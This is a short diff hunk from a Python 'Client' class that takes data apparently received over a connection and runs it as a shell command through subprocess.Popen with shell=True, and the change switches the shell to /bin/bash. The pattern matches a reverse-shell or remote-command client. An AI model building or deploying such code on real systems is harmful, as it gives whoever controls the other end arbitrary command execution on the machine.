@@ -57,7 +57,7 @@ class Client:
 
                 if len(data) > 0:
                     try:
-                        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stderr=subprocess.PIPE,
+                        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, executable='/bin/bash', stderr=subprocess.PIPE,
                                                stdout=subprocess.PIPE, stdin=subprocess.PIPE)
                         while cmd.poll() is None:
                             l = cmd.stdout.readline()
